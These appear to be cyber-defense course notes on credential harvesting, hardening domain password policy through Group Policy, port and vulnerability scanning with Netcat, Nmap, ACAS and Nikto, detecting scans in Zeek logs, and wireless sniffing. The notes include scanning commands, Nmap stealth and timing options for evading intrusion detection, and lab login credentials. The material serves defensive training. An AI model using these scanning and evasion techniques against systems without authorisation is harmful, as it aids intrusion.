########## M6 L1 ############
######### Harvesting Credentials ###########

Introduction to Credential Harvesting
﻿
Credentials are used to access devices and systems on a given network. Credentials include user account names and passwords. According to MITRE ATT&CK Tactic Credential Access (TA0006), harvesting credentials consists of techniques for accessing, identifying, and stealing user account names and/or passwords. Techniques used to obtain credentials include keylogging, Man-in-the-Middle (MITM) attacks, phishing, and credential dumping. Specific techniques are detailed later in this lesson. The use of legitimate credentials gives adversaries access to systems, making them harder to detect, and provides the opportunity to create more accounts to help achieve their goals. 


Credential harvesting is a tactic in the Enterprise Framework from MITRE ATT&CK, as shown in Figure 6.1-1:

﻿![image](https://github.com/user-attachments/assets/138c5875-3617-47c0-8217-fe69b7edbcbf)

Credential harvesting is also included in the reconnaissance phase of the MITRE ATT&CK Framework. According to MITRE ATT&CK, "the reconnaissance phase consists of techniques used and data that adversaries gather that can be leveraged to aid or help coordinate future campaigns or attacks, which likely occur later within the MITRE ATT&CK Framework. The data collected during the reconnaissance phase can be collected in an active or passive manner and information may include data points related to target systems, users, architecture, devices, or infrastructure."


Active data collection occurs when the adversary has infiltrated the target network in an attempt to identify and leverage any vulnerabilities and collect information available. Comparatively, passive data collection is not as infiltrated in the target network. Passive data collection occurs when the adversary is not actively manipulating or searching on the target network, rather, the adversary may be listening or watching traffic.

---------------------------------------------------------------------------------------

Credential Harvesting Techniques 
Brute Force Attacks and Credential Harvesting
﻿

Credential harvesting is categorized under the MITRE ATT&CK technique for brute force attacks (T1110). Brute force attacks include techniques that can be used when the password portion of credential information is not known. Brute force includes the following sub-techniques:

![image](https://github.com/user-attachments/assets/2a0637e8-8856-4aa1-bd8f-70f785b0ef33)

Additional Credential Harvesting Techniques


Multiple credential harvesting techniques exist that do not fall under the brute force attack techniques. Below are the techniques:

![image](https://github.com/user-attachments/assets/d609ad4a-f817-4586-a590-12711c951842)

--------------------------------------------------------------------------

Defenses Against Credential Harvesting
The primary defense against credential harvesting is strong password management. Enforcing all password settings ensures that passwords are complex, changed frequently, and require two-factor authentication. Below are three strategies that should be implemented to prevent credential harvesting:

![image](https://github.com/user-attachments/assets/7a4890a9-c2e7-4cd7-bdb8-0517eae55e8a)

--------------------------------------------------------------------

Harvesting Credentials by Password Spraying | Part 1
﻿

Walk through the MITRE ATT&CK technique of password spraying, as seen from an adversarial perspective. A small dump of credentials was obtained through a successful phishing attack. Using the information from the dump, a small password spraying attack is conducted in an attempt to access the network. 

------------------------------------------------------------------

rotecting Credential Data from Harvesting
Walk through accessing the network's primary Domain Controller (DC) to configure and enforce strict password settings in an effort to prevent credential harvesting. 

﻿

Workflow

﻿

1. Log in to the ch-dc1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. The domain's password policy can be easily reviewed using PowerShell. To do so, select the Windows icon > Administrative Tools.

﻿

3. In the Administrative Tools window, select Windows PowerShell.

![image](https://github.com/user-attachments/assets/2a52cd98-5aa7-454c-8225-5ad721b8bad5)

. In the Windows PowerShell window, enter the following cmdlet:
PS C:\Users\trainee.vcch> Get-ADDefaultDomainPasswordPolicy



The following results are returned:

![image](https://github.com/user-attachments/assets/f8a6de3d-61ec-402d-997f-582a4aca35cf)

Below are relevant fields to the domain's password policy from the Windows PowerShell output:

![image](https://github.com/user-attachments/assets/287f05dd-26db-498d-8d85-ffa896149f62)

The current domain password policy is not secure to prevent brute force attacks. Currently, passwords are only required to be one character long, changed once every 365 days, and can be changed to a password that was previously used. These three fields create an environment that is extremely vulnerable. The next steps identify how to modify and harden the domain's password policy.


5.  Select the Windows icon > Administrative Tools. Select Group Policy Management:

![image](https://github.com/user-attachments/assets/d6024e91-5e9d-48fb-aae4-55918006a8e4)

The Group Policy Management window opens:

![image](https://github.com/user-attachments/assets/4b32d344-08ba-4d96-a1b8-238281f1f77e)

Navigate to Group Policy Management > Forest: vcch.lan > Domains > vcch.lan > Default Domain Policy:

![image](https://github.com/user-attachments/assets/82130082-96ad-4be3-b030-9d5f790fdc7b)

Right-click Default Domain Policy and select Edit... The Group Policy Management Editor appears:

![image](https://github.com/user-attachments/assets/f3c8f960-91fe-4395-aded-4c5bc2163b4f)

8. Navigate to Computer Configuration > Policies > Windows Settings > Security Settings > Account Policies > Password Policy:

![image](https://github.com/user-attachments/assets/f918aaab-df80-4555-b492-caecf49fb730)

The password policy for the Default Domain Policy is located here. 


Notice that the output from the cmdlet executed in step 4 reflects the Policy Settings located in the Group Policy Management Editor:

![image](https://github.com/user-attachments/assets/b78fce0a-44bd-453b-b067-a2311af53866)


The current password policy settings are not strong:
Only require one character long.
Changed once every 365 days.
Changed to a previously used password.

9. Right-click Enforce password history and select Properties.

![image](https://github.com/user-attachments/assets/cdf0cce1-cd75-40dd-829f-71f98ea5d8a4)

he Enforce password history Properties window appears:

![image](https://github.com/user-attachments/assets/2e627f4e-3462-48b0-b0d6-88c84dcc6f0c)


10. Ensure Define this policy setting is checked. Set the passwords remembered to 24: 

![image](https://github.com/user-attachments/assets/915150c7-7ab8-4852-961b-6510092a9787)

NOTE: The maximum number of passwords Windows can remember is 24. 


11. Select Apply > OK.


12. Right-click Maximum password age, select Properties, and repeat the instructions from step 9. Set the password expiration to 60 days. 


13. In the Suggested Value Changes dialog box, select OK. 

![image](https://github.com/user-attachments/assets/cace6aa6-7434-453c-8d3c-3b8696764c3c)

14.  Select Minimum password age and repeat the instructions from step 9; set the password expiration to 1 days. 


15.  Select Password must meet complexity requirements, enable Define this policy setting, and select Enabled. Select Apply > OK.


16.  Select Store password using reversible encryption, and ensure Define this policy setting is unchecked. Select Apply > OK.


The Group Policy Management Editor should look like the following:


![image](https://github.com/user-attachments/assets/15f982c6-fd8b-4b12-aa9f-0f422fb57a53)


he Password Policy for the Default Domain Policy has been modified to enforce password settings that harden the domain. The password settings create an environment that is more difficult for the adversary to perform an attack using a brute force tactic.


NOTE: When creating a new GPO, the final step is to link the GPO to AD containing the desired groups and machines.

-------------------------------------------------------------------------------

Configure a GPO

The Virtual City City Hall (VCCH) network is taking on some new roles to support the monitoring of security in the network. The new roles require some machines on the network to contain highly sensitive information. Access to the machines and the data is highly controlled and requires a secure policy regarding credentials. Configure a GPO titled Security Control to support new security roles.

﻿

Workflow

﻿

1. Log in to the VCCH's primary DC — ch-dc1 — using the following credentials:

Username: trainee
Password: CyberTraining1!

----------------------------------------------------------------

GPO Access and Configuration
﻿
![image](https://github.com/user-attachments/assets/3bd3831f-ddf1-4eba-add1-6da91846fbc3)

Figure 6.1-20

﻿

The Group Policy Management provides access to view and manage GPOs within a given domain. 
![image](https://github.com/user-attachments/assets/6f1e8904-d83f-4c61-9497-0cb656d82eab)

-----------------------------------------------------------------

GPOs in VCCH
﻿

Figure 6.1-21

﻿

The Group Policy Objects folder contains all the domain's current GPOs.

﻿

NOTE: The following steps continue from the previous task.

﻿

2. Create a new group policy object titled Security Control, and access the GPO's password policy settings.

![image](https://github.com/user-attachments/assets/3b5a90f5-2837-4818-a3af-7738ec133162)

-----------------------------------------------------

Password Policy Settings
The following path leads to the GPO's password policy setting: 

﻿

﻿![image](https://github.com/user-attachments/assets/4c2c444f-89a2-450d-8ec6-78fee39c128c)


Figure 6.1-22

﻿

NOTE: The following steps continue from the previous task.

﻿

3. Edit the newly created GPO to enforce the password settings provided below.

Enforce password history: 24

Maximum password age: 30

Minimum password age: 1

Minimum password length: 12

Password must meet complexity requirements: Enabled

![image](https://github.com/user-attachments/assets/5452a657-cf31-497b-b64e-0425f7e02dbe)


---------------------------------------------------------------------------------------------------

Configured GPO
The required changes are made to the GPO:

﻿![image](https://github.com/user-attachments/assets/ecd93a97-3e60-4ea7-a2f9-fdac74604334)

The final step to enforce the new GPO is to link it to AD.


NOTE: The following steps continue from the previous task.


4. Once Link an Existing GPO... and Security Control are selected, the newly created GPO is added to the group policy objects found under vcch.lan:

![image](https://github.com/user-attachments/assets/070b7be2-9847-4d0d-bfc9-64c1a9ac1033)

![image](https://github.com/user-attachments/assets/148e3d54-3d03-46d4-b8ad-57f29ac4ea71)

From this point, the domain administrator from within the security group manages the GPO. They add users and computers as needed to handle and view sensitive information. The established policies put the domain in a secure posture to defend against credential harvesting through password mismanagement. 

----------------------------------------


########## M6 L2 ############
######### Identifying Hosts and Services ###########

Host Identification and Scanning Refresher


![image](https://github.com/user-attachments/assets/2c81955e-17fd-4557-b42c-9e2d6aea67ca)

Host identification and scanning typically occur early on in the MITRE ATT&CK lifecycle and occur continuously during an attack campaign as the adversary continues to expand access. The purpose of host discovery is to figure out which hosts are accessible over the network. Some protocols a Cyber Defense Analyst (CDA) might encounter during host discovery are Address Resolution Protocol (ARP), Internet Control Message Protocol (ICMP), Domain Name System (DNS), and Transmission Control Protocol (TCP)/User Datagram Protocol (UDP) pings.


After the host is verified as accessible, the adversary proceeds to port scan the host(s). Port scanning is done to check which services are up and running. Upon receiving port scan results, the adversary can determine the host's purpose in the network (e.g., is it a web server, mail server). Recall that this is because port numbers typically correspond to specific services.


After the adversary gathers a list of open ports, and thus a list of services running on the host, they would proceed to conduct vulnerability scanning. Vulnerability scanning probes a service — or many services — and attempts to discover any weaknesses in configuration. Once the adversary discovers a vulnerability they can leverage, they launch an exploit, gaining access into their target system.


These are not hard and fast rules, and these actions do not have to occur sequentially or together at all. However, this sequence provides a logical progression on the avenues an adversary may take to gaining the requisite information in selecting the appropriate exploit. Knowing how the adversary functions enables a CDA to take opposing mitigating actions.

----------------------------------------------------------------------

Port Scanning



![image](https://github.com/user-attachments/assets/aa03cc0f-028a-4125-9f86-baad27e1d65a)

Port scanning is the technique of scanning hosts on a network for running services. The MITRE ATT&CK technique identifier for port scanning, known as network service scanning to MITRE, is T1049. Port scanning may or may not be preceded by host discovery.


Port scanning leverages two transport layer protocols:
Transmission Control Protocol (TCP)
User Datagram Protocol (UDP)

You should be familiar with these protocols from previous courses. It is more common to rely on TCP to conduct a port scan as UDP scans do not always return definitive results detailing if a port is open.


TCP Port Scan
TCP is a connection-orientated protocol — it relies on a three-way handshake to establish a connection. Recall that the client initiating the connection sends a packet with the Synchronize (SYN) flag set. The receiving server replies with a packet including the SYN/Acknowledge (ACK) flags, to which the client responds with a packet including the ACK flag set. This sequence establishes the connection. There are a few exceptions to this rule, such as Hypertext Transfer Protocol (HTTP) FAST GET, which sends data with the SYN packet, but these instances are outside the scope of this lesson. Port scanners exploit the requirement of the three-way handshake to determine if a port is open. If the client receives a SYN/ACK from the server, then this is all the information needed to surmise that the port is open. If a packet with a Reset (RST) flag is received, then the port is closed. If there is no response from the server, then port filtering is likely occurring somewhere in the network or on the server host, and the client is unable to determine if the port is open.


![image](https://github.com/user-attachments/assets/e60a8b26-d163-4dad-809b-e64b16f515b7)


UDP Port Scan
UDP is not connection-orientated. Packets are simply assigned an Internet Protocol (IP) and a port number and shipped off. There is no built-in mechanism in UDP that determines if the packet made it. The simplicity in UDP serves as a disadvantage while port scanning. If a response is received from the server, then you can definitively say that the UDP port is open. However, sending UDP packets at a host often returns no data if the port is open. This response would be no different if the port was filtered. If the port is closed, then an ICMP Port Unreachable message may be received, which can be generated by the server host or gateway. Other ICMP messages mean that the port is filtered.


![image](https://github.com/user-attachments/assets/03266c56-af2b-43fe-8060-678ae2fbb78d)

------------------------------------------------------------------------------------------------------------------------

Port Scanning Utilities
Netcat
﻿

Often called the TCP/IP Swiss Army knife, Netcat is a versatile tool that can be used for purposes such as a chat/messaging server, file transferrer, and, of course, port scanner. Netcat has a very small footprint and comes pre-installed on most Linux distributions and is easily installed on Windows. The preinstalled version of Netcat on several Linux versions is often different from the one you can build from source code. A common modification is the removal of the ability to execute programs due to the security implications; namely being able to remotely gain a shell. Figure 6.2-3 shows the help menu presented by Netcat.


![image](https://github.com/user-attachments/assets/6eddfeab-d379-4fa6-93b0-e24045da9598)


Telnet


Telnet is a protocol that allows remote logins to another system running a Telnet server. You should already be familiar with the security implications of using Telnet for remote administration; however, the Telnet client is still useful for port scanning and banner grabbing. The client comes preinstalled on several versions of Cisco Internetwork Operating System (IOS) and other routing Operating Systems (OS). Figure 6.2-4 shows usage options for Telnet.


![image](https://github.com/user-attachments/assets/3dc87a97-6c22-4a53-b80b-a5143fd1a50a)

--------------------------------------------------

Port Scanning and Banner Grabbing with Netcat
The resulting output from the previous command is shown below:

![image](https://github.com/user-attachments/assets/c7df9017-a6b2-4eff-9807-09e513442acf)

As detailed, SSH is open on this device. Now that the open port is verified, perform a banner grab to get more information on the service.


NOTE: The following steps continue from the previous task.


7. Run the nc command without the -z option on the open port to perform a banner grab:
(trainee@dmss-kali)-[~] $ nc -nvw 10 172.35.1.21 22



Depending on the service running or how the service is configured, the server may not always return a banner or data. This was seen in the first port scan against HTTP; even with the socket left open, the server sent no data. 

---------------------------------------------------------------

Port Scanning and Banner Grabbing with Telnet
From the output, it is evident that the version of SSH on the host is OpenSSH 5.5.

![image](https://github.com/user-attachments/assets/2a196057-02ac-44c4-95eb-7ca0b23ddda9)

Recall seeing a -u option for UDP mode with Netcat. This functionality does not work as expected and is not recommended for use as a port scanner. Netcat looks for an ICMP UDP port unreachable to determine if a port is closed. If the port is filtered or open, then the program states the port is open. As it stands, the messages returned from UDP scans are often unreliable and may confuse analysts. If nc must be used to port scan UDP ports, the most surefire way to assess if a port is open is if data is received from the server. This means the -z option is not possible.


Table 6.2-3 details the UDP Port States and the message received from Netcat:

![image](https://github.com/user-attachments/assets/92e6a1c8-33f7-4895-b473-178947acf074)

Telnet is a less versatile tool than Netcat, but the choice of tools is not always available in the environment. For example, many Cisco IOS devices may not have Netcat, but may have Telnet installed.

--------------------------------------------------

Nmap
Nmap is a popular free and open-source utility for network discovery and security auditing. It is a powerful tool that does much more than port scanning; many network and systems administrators use it for vulnerability scanning, network inventory, managing upgrading schedules, and more. Due to its popularity, Nmap is a well-documented utility. There are versions that support Windows, Linux, and macOS. Unlike Netcat however, Nmap does not come preinstalled on most OSs. Nmap also has a few sub-projects such as Ndiff and Zenmap. Ndiff compares two different Nmap scan results and reports differences. Zenmap is a Graphical User Interface (GUI)-based tool that allows the user to create and save scanning profiles.

﻿

There are six NMAP port states according to Nmap.org documentation:

﻿

Open
﻿

An application is actively accepting TCP connections or UDP packets on this port. Finding these is often the primary goal of port scanning. Security-minded people know that each open port is an avenue for attack. Attackers and pen-testers want to exploit the open ports, while administrators try to close or protect them with firewalls without thwarting legitimate users. Open ports are also interesting for non-security scans because they show services available for use on the network. Before getting too excited about an open port, note that it is possible that the application is protected with a TCP Daemon Wrapper (TCPD) or that the application itself is configured to only service approved client IP addresses. Such cases still leave more attack surface than a closed port.

﻿

Closed
﻿

A closed port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it. They can be helpful in showing that a host is online and using an IP address — host discovery or ping scanning — and as part of OS detection. Because closed ports are reachable, they may be worth scanning later in case some open up. Administrators may want to consider blocking such ports with a firewall so they appear in the filtered state.

﻿

Filtered
﻿

Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. The filtering could be from a dedicated firewall device, router rules, or host-based firewall software. These ports frustrate attackers because they provide so little information. Sometimes they respond with ICMP error messages such as type 3 code 13 — destination unreachable: communication administratively prohibited — however, filters that simply drop probes without responding are far more common. This forces Nmap to retry several times in case the probe was dropped due to network congestion rather than filtering. This sort of filtering slows scans down dramatically.

﻿

Unfiltered
﻿

The unfiltered state means that a port is accessible, but Nmap is unable to determine whether it is open or closed. Only the ACK scan, which is used to map firewall rulesets, classifies ports into this state. Scanning unfiltered ports with other scan types such as Window scan, SYN scan, or FIN scan, may help resolve whether the port is open.

﻿

Open|Filtered
﻿

Nmap places ports in this state when it is unable to determine whether a port is open or filtered. This occurs for scan types in which open ports give no response. The lack of response could also mean that a packet filter dropped the probe or any response it elicited. So Nmap does not know for sure whether the port is open or being filtered. The UDP, IP protocol, FIN, NULL, and Xmas scans classify ports this way.

﻿

Closed|Filtered
﻿

This state is used when Nmap is unable to determine whether a port is closed or filtered. It is only used for the IP Identification (ID) Idle scan discussed in the TCP Idle Scan (-sI) section.

---------------------------------------------------------------------------------------

Service and OS Versioning
Nmap has a few options that allow for service, version, and OS identification. They are as follows:

-sV: Enables service and version detection. This is done by sending out a series of probes that elicit information.

-O: Enables OS detection. Nmap provides a best guess of what the underlying OS is based on TCP/IP Stack fingerprinting. Different OSs generally have different options set in their TCP/IP options which enables OS detection.

-------------------------------------------------------------

UDP Scan
Nmap has UDP scanning capabilities as well and requires superuser privileges to run. The -sU option denotes a UDP scan, and can be done in conjunction with other TCP scans.

---------------------------------------------------------------------

Nmap Operational Security
Port scanning involves hundreds, if not thousands, of packets depending on the scan options. IDSs and Intrusion Prevention Systems (IPS) easily pick up on this activity. Nmap comes with timing templates, which enable the penetration tester to reduce the odds of being caught. These range from the T0 option, which is the least likely to set off alerts, to T5, which is an extremely loud packet blaster. The TCP options set for each template can be seen in Table 6.2-4. Do not memorize this table, it simply gives some insight on what is done differently from T0 to T5.

![image](https://github.com/user-attachments/assets/ecb36fef-f078-45e9-a86d-280a9c59f708)

NOTE: Timing parameters in Table 6.2-4 are shown in milliseconds.


The author of the documentation states that if you have a decent broadband connection and are not worried about setting off an IDS/IPS, then T4 is a good template to use. Keep in mind that the templates on the lower end take more time to complete as they wait more time before sending out more packets, as seen by the scan delay. For example, the T2 template can take more than ten times longer than the T4 template.


-----------------------------------------------------------------------------

Port Scanning Recap
The takeaway is that there are a few different port scanning utilities available to CDAs. The three covered are Netcat, Telnet, and Nmap. Some options that may come in handy for a CDA are as follows:

﻿

Netcat
-n: Disable port and name resolution
-v: Verbose
-w: Wait timeout
-z: Zero data
Nmap
-p: Port specification
-Pn: Do not conduct host discovery
-sS: SYN Stealth
-sT: Connect
-sA: ACK scan
-sW: Window scan
-sF: FIN scan
-sN: Null scan
-sX: Xmas scan
-sM: Maimon scan
-sU: UDP scan
-T[0-5]: Timing template
-sV: Attempt service and version detection
-O: Detect the OS
From the defensive perspective, hosting services leave open ports on a system. These open ports increase the attack surface within the network and may enable adversaries to gain footholds within their targeted network. Disabling an unneeded service reduces the attack surface. Firewall devices may also protect against scanning attempts if a service is needed, though it may be possible to circumvent them. Test and validate firewall rules for the best mitigative results.

-----------------------------------------------------------------------------------------

Vulnerability Scanning
Vulnerability scans oftentimes follow port scans. For example, when a host is scanned and port 80 is determined to be up, the CDA might run Nikto, an open-source vulnerability scanner for assessing web servers. However, this is not always the case. Vulnerability scanners have become much more robust and may even incorporate port scanners. Vulnerability scanners — such as Assured Compliance Assessment Solution (ACAS) — are made to be more comprehensive. Vulnerability scanners fall underneath the reconnaissance tactic of MITRE ATT&CK under the technique ID T1595.002. The results of a vulnerability scanner may include the following:

Unwanted services running.
Default credentials in use.
Out-of-date software in need of hotfixes, patches, or updates.
Weak algorithm usage.
Insecure configurations.
Existing exploits for software.
Adversaries may use vulnerability scanners to delve into a host's weaknesses and find room for exploitation. Network defenders use vulnerability scanners to assess their network and locate mitigations that should be applied. Some services, such as web, are incredibly complex with a seemingly infinite number of configurations, software backends, etc. Vulnerability scanners dedicated to just scanning web services exist.

﻿

Vulnerability scans can be unauthenticated or authenticated. Unauthenticated scans pass no additional information to the scanner for a provided service. Authenticated scans provide information needed to log into services to gather configuration settings and assess a service more in-depth — past just the login page. Both have their uses; unauthenticated scans allow a CDA to see results as adversaries would see them, while authenticated scans enable the defender to gather more vulnerability information about a service. Both authenticated and unauthenticated scans should be evaluated for a complete picture.

﻿

Vulnerability scanners include the following:

ACAS: Also known as Nessus. ACAS is frequently used by CPTs and likely encountered as a CDA.
Nmap: Mentioned as a port scanner; however, it can function as a vulnerability scanner, especially with the Network Scripting Engine (NSE).
OpenVAS: Another full-featured vulnerability scanner.
Nikto: An open-source web vulnerability scanner. It specializes in finding web-based attacks such as Structured Query Language (SQL) injection and Cross-Site Scripting (XSS) vulnerabilities.
Burp Suite: Another web vulnerability scanner.
ACAS, Nmap NSE, and Nikto are covered more deeply in the following lab.

-----------------------------------------------------------------

Nmap Network Scripting Engine
Nmap NSE comes installed with several scripts designed to perform more in-depth vulnerability scanning. You can also write your own. Third-party scripts exist as well, but be cautious when running scripts downloaded off the internet as they could contain malicious code.

---------------------------------------------------------------------

Nikto
Nikto is a one-trick pony, but it does its one trick well. Nikto only scans web services, but it is a fantastic tool to use when encountering a web server. It is easy to install, easy to use, and capable of a fairly comprehensive scan in a relatively short amount of time. It is capable of identifying several vulnerabilities in the Open Web Application Security Project (OWASP) Top 10 such as security misconfiguration, cross site scripting, and injection.

﻿------------------------------------------------------------

 
ACAS Continued
By now, the ACAS scans should be done or close to done. As a brief refresher, recall that you ran a Basic Network Scan against the 172.35.2.0/24 subnet, which contains core services for this network. The results are shown in Figure 6.2-42:

![image](https://github.com/user-attachments/assets/4f990872-0893-4a7e-a9f9-ca2e2e197305)

There are three hosts in the subnet from the output, and most of the vulnerabilities are informational.

---------------------------------------------------------------

Detecting Scanners
Luckily for network defenders, port and vulnerability scanners are generally noisy. Depending on the scanning software and options selected while running, it can be easy to spot these scanning tools in traffic. Use Zeek logs to identify scanning activities in Kibana.

﻿----------------------------------------------------

 Detecting Adversaries Using Timing Templates
The trainee can tell it was a SYN Stealth because the maximum client packets was 2. This is indicative of a SYN and a RST. Figure 6.2-51 details one of the entries expanded, which alludes to this:

﻿
![image](https://github.com/user-attachments/assets/41546997-4cac-40d3-ae23-b09153baa91a)

﻿

Figure 6.2-51

﻿

Recall that Nmap has built-in timing templates that try to mask scanning attempts. In the following steps, observe a timing template of 0, also known as the paranoid timing template.

﻿--------------------------------------------------------------------------------------

Detecting Adversaries Using Vulnerability Scanners
Vulnerability scans are often preceded by port scans, depending on the tool. This is certainly the case for ACAS. In the next set of steps, observe an ACAS scan in traffic.

--------------------------------------------------------------------------------

Detecting ACAS
The scanning host is 199.63.64.104 as seen in the source.ip column. Notice that in this case, the connections have more packets than during a port scan. The last entry in this screenshot has 24 client packets and 42 server packets. This is because the scanning host actually connects to the server AND sends and receives data to attempt to identify services and vulnerabilities.

![image](https://github.com/user-attachments/assets/49d8cd2f-45c4-40a2-ab03-f0bcdf7fc65c)


A bonus is that ACAS also employs the user agent string Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0) when scanning web-based ports.


To summarize, a vulnerability scanner is generally preceded by a port scan but also has longer sessions due to actually sending and receiving data to the server to identify vulnerabilities.


ACAS does not necessarily have IDS evasion built in. ACAS does, however, have a low-bandwidth mode, which enables slower scans and makes them less detectable. This function is meant to be used over links with less throughput and reduces the number of hosts scanned at a time. Also, low-bandwidth mode slows down the scan if network congestion is detected. However, scans using low-bandwidth mode are still fairly obvious, though this may vary depending on the amount of network traffic. 

-----------------------------------------------------------------------------

Detecting Nikto Scans
Examine what Nikto scans look like in traffic.


-----------------------------------------------------

Detecting Scanners Recap
This lab showed what scanners may look like in traffic. The following was examined:

NMAP scans
ACAS scans
Nikto scans
A few potential IDS evasion techniques

-------------------------------------------------------

Source IP Address Solution
There were two datasets examined in this lesson to visualize abnormal traffic patterns. The first was viewing the Zeek connection log. However, this does not provide a useful picture.

![image](https://github.com/user-attachments/assets/04d14ef7-bc7d-4125-8ed5-b35f8e32b0eb)

This does not rule out Nmap scans with slower timing templates. Check the other dataset discussed in this lesson — the Zeek HTTP logs — before going down that rabbit hole.

![image](https://github.com/user-attachments/assets/d59156b8-a96f-41c1-9354-e08fcbaeaa23)

There is an abnormal number of web requests toward the end. Select the first spike. It seems evident that one host is responsible for most of this traffic.

![image](https://github.com/user-attachments/assets/3e754a03-a4b8-497a-a0a5-2a59f4af9702)

![image](https://github.com/user-attachments/assets/f1ba539b-e1b5-4328-bfe7-46ba439e4ec0)

During the spike, the one IP address is responsible for 92% of the traffic! The malicious actor in this case is 128.0.7.23.


---------------------------------------------------

Scan Type Solution
Both ACAS and Nikto have built-in web scanners. However, ACAS is more comprehensive as a scanner, and is usually preceded by a port scan.

![image](https://github.com/user-attachments/assets/81585003-881b-482d-aec2-681d26d738eb)


There does not seem to be evidence of port scanning based on the query for short sessions. However, the requested URIs do point toward Nikto's known behavior, which uses a dictionary to request several webpages.

![image](https://github.com/user-attachments/assets/3930f0b7-2993-446e-90a9-bcc63239b734)

Of the possible answers, Nikto is the best answer.

--------------------------------------

Evasion Techniques Solution
Upon examining the requested URIs in greater detail, it seems like the case of several letters is mixed.


![image](https://github.com/user-attachments/assets/7d71d142-9f43-4c55-ba85-074a567a9fe6)

Recall that Nikto may mangle the URLs slightly in an attempt to circumvent some IDS settings. This can be confirmed by viewing the Nikto help page.

![image](https://github.com/user-attachments/assets/1953e085-848c-4e48-b921-65d731a7eaad)

Congratulations! You have completed the practical exercise.

------------------------------------------------------------------

########## M6 L3 ############
######### Wireless Sniffing ###########

Wireless Networking Overview
Overview
﻿

The 802.11 family of radio protocols is commonly referred to as Wireless Fidelity (Wi-Fi). Wireless network traffic is sent over the 802.11 radio protocol, which spans Layer 1 (Physical Layer) and Layer 2 (Data Link Layer) of the Open Systems Interconnection (OSI) model. In Layer 1, the 802.11 defines the frequency (e.g., 2.4GHz and 5.0Ghz) and modulation, and in Layer 2, the protocol defines the device addressing. This family is subdivided into smaller protocols based on the frequency and rate of the data being transmitted. 

![image](https://github.com/user-attachments/assets/c7901432-5cb1-446d-9300-3538979b2b7b)

Wireless Access Points


Wireless Access Points (WAP) are wireless devices operating at layer 1 and layer 2, with some implementations providing additional layer 3 support, such as routing. They provide clients mobile access to network resources, point-to-point connectivity for Metropolitan Area Networks (MAN), and administrator connections to client devices over the 802.11 protocol. Each access point is located by its Service Set Identifier (SSID), though it is called an Extended SSID (ESSID) when multiple access points use the same SSID. The Media Access Control (MAC) address of the radio interface serving the network identified by a specified SSID is the Basic Service Set Identifier (BSSID) of that network. When a named network is administered by multiple access points, the ESSID consists of all BSSIDs serving the network. In such a case, it is possible to move from one room to another, change from one BSSID to another, but never change the ESSID of the network a device is connected to.


Channels


Channels are specific, narrower bands of the Radio Frequency (RF) spectrum over which a WAP operates. The numbers — 1 through 14 — in Figure 6.3-1 show the associated channels and 22 megahertz (MHz) overlapping RF bands used in 802.11 protocols.

![image](https://github.com/user-attachments/assets/71c9aa8d-919f-416d-99e4-36572b084202)


Types of Frames


In the 802.11 wireless protocol, a number of management frames are used for announcing, creating, and removing connections to the network. 


Beacon


Beacon frames are periodic announcements of wireless network information, sent over the RF channel on which the WAP operates. The WAP broadcasts information such as the SSID, device capability (e.g., encryption details), supported data rates, interval between beacon transmissions, and miscellaneous details used for establishing RF communication with the WAP.


Deauthentication Frame


The deauthentication frame is sent when one party in the connection wishes to terminate the connection. This disassociates a device from the access point, so any reassociation requires new authentication when encryption is employed. When sent, this frame includes a reason code for the termination, which may be Deauthenticated because sending station is leaving BSS or Disassociated due to Inactivity; there are more than 60 such codes. Most importantly, in certain types of wireless attacks, these deauthentication frames are spoofed by an attacker to force a client device off a network to either assume its place or to force reauthentication. Figure 6.3-2 shows the structure of an 802.11 management frame where the reason code is sent. See the additional resources for more information on the various types of deauthentication reasons.

![image](https://github.com/user-attachments/assets/85d4fa21-7c9d-4d48-8e4c-4f23e8877114)


--------------------------------------------------------------------------------

Wireless Sniffing | Overview
Overview
﻿

Wireless sniffing is a form of reconnaissance, potentially leading to host or even credential discovery in mission partner networks employing wireless technology.

﻿

MITRE defines this technique — both wired and wireless —  as the use of a network interface on a system to monitor or capture information sent over a wired or wireless connection and identifies it with the code T1040. This information may include authentication handshakes, name service resolution queries, service requests (revealing which services are active in a network), and a variety of metadata allowing the potential identification and fingerprinting of active hosts in the environment. 

﻿

This type of attack accomplishes information gathering for the threat adversary. There are a number of ways for this information to be gathered. 

﻿

Types
﻿

Wireless sniffing can be conducted either actively or passively. While the capture itself is always a passive action — it requires no interaction with other devices or services to capture — the amount and quality of the data can vary. 

﻿

Passive Sniffing
﻿

When an adversary's priorities are stealth and maintaining target network access, passive sniffing is the ideal route to follow. In this, the attacker does not interact with any targets, but simply takes advantage of wireless signals sent through a network and captures the packets that are being transmitted over the air.

﻿

Active Sniffing
﻿

When an adversary's priorities are information gathering, and stealth is an acceptable quality to risk, active sniffing allows for more potential data to be gathered. This type of sniffing is a combination of passive sniffing on one attacker machine and, on the same machine or, ideally — a separate one that is expendable. The injection of traffic leads to a breakdown in secure switching mechanisms or reliable authorities for name resolution or network access, leading to Man-in-the-Middle (MitM) access to data. This can allow the collection of traffic that would otherwise be encrypted.

﻿

Tradeoffs
﻿

The advantage of active sniffing is that the adversary gathers more valuable information. The cost is stealth, leading to potential discovery from network defenders. The advantage of passive sniffing is security of position, in that an attacker can quietly listen and remain undiscovered. The cost of passive sniffing is time. 

﻿

Goals
﻿

Threat adversaries employing wireless sniffing are attempting to acquire various types of information for use in follow-on exploitation, lateral movement, and privilege escalation. The following types of data can be obtained through analysis of raw Packet Captures (PCAP):

﻿

Host Information
﻿

The number, type, and names of various host and networking devices on the network are likely to be extracted from sniffing. The network communication contains various signatures such as Time to Live (TTL) numbers, Maximum Segment Size (MSS) values, or Transmission Control Protocol (TCP) window size, which contribute to an attacker's ability to passively identify the OSs of various hosts. If an attacker is able to capture traffic containing authentication traffic (e.g., Server Message Block (SMB) share access), then the available information includes hostnames, usernames, and service names on both ends of the exchange. If unencrypted, this collection can even include credentials.

﻿

Addressing
﻿

Sniffing also yields the IP addresses and MAC addresses of devices communicating on the same wireless network as the sniffing device. Only the MAC addresses of devices on the same Virtual Local Area Network (VLAN) are visible, but even this amount of segmentation is valuable knowledge to the attacker. Capturing and observing Address Resolution Protocol (ARP) requests and replies also aids in revealing this local VLAN architecture. 

﻿

Services
﻿

Even without running an active scan, a savvy threat adversary can determine which services are available in a wireless network by observing other devices accessing those service on common ports and over known protocols. This reveals not only whether services such as web, File Transfer Protocol (FTP), e-mail, network data storage, or others are running, but also on which specific devices and ports.

